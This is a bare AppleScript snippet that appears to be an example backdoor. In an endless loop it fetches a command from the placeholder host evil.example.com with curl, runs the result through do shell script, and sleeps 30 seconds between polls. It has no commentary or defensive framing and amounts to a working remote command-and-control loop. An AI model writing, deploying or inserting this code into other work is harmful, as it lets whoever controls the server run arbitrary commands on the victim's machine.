repeat
	try
		set cmd to do shell script "curl -s http://evil.example.com/cmd"
		do shell script cmd
	end try
	delay 30
end repeat
